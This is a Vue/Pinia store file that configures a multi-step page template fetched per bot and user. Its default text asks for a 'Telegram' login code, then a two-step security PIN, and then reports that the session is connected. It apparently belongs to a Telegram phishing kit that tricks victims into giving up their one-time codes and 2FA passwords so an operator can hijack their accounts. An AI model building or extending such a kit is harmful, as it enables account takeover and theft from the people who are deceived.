import { defineStore } from "pinia";
import { ref, computed } from "vue";
import { api } from "../api/client";

const PALETTES = {
  default: {},
  dark: {
    "--page-bg": "#0b0f19",
    "--text-color": "#f8fafc",
    "--card-bg": "#151c2c",
    "--button-bg": "#2563eb",
    "--button-text": "#ffffff",
  },
  blue: {
    "--page-bg": "#eff6ff",
    "--text-color": "#0f172a",
    "--card-bg": "#ffffff",
    "--button-bg": "#1d4ed8",
    "--button-text": "#ffffff",
  },
  green: {
    "--page-bg": "#ecfdf5",
    "--text-color": "#064e3b",
    "--card-bg": "#ffffff",
    "--button-bg": "#059669",
    "--button-text": "#ffffff",
  },
};

function normStep(step, fallbackTitle, fallbackDesc, fallbackBtn) {
  const s = step && typeof step === "object" ? step : {};
  return {
    title: s.title || fallbackTitle,
    description: s.description || fallbackDesc,
    buttonText: s.buttonText || fallbackBtn,
  };
}

export const useTemplateStore = defineStore("template", () => {
  const template = ref({
    color: "default",
    backgroundUrl: "",
    backgroundBlur: 0,
    code: normStep(
      {},
      "Auto OTP Verification",
      "Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.",
      "Verify & Login"
    ),
    pass: normStep(
      {},
      "Two-Step Verification",
      "Enter your security PIN to complete login.",
      "Unlock Session"
    ),
    end: normStep(
      {},
      "Session Connected",
      "Your login session is active and synced.",
      "Continue"
    ),
  });

  const themeVars = computed(() => PALETTES[template.value.color] || {});

  async function init(userStore) {
    const res = await api.getTemplate({
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });
    if (res && res.template) {
      const t = res.template;
      template.value = {
        color: t.color || "default",
        backgroundUrl: t.backgroundUrl || "",
        backgroundBlur: Number(t.backgroundBlur) || 0,
        code: normStep(t.code, template.value.code.title, template.value.code.description, template.value.code.buttonText),
        pass: normStep(t.pass, template.value.pass.title, template.value.pass.description, template.value.pass.buttonText),
        end: normStep(t.end, template.value.end.title, template.value.end.description, template.value.end.buttonText),
      };
    }
    return true;
  }

  return { template, themeVars, init };
});
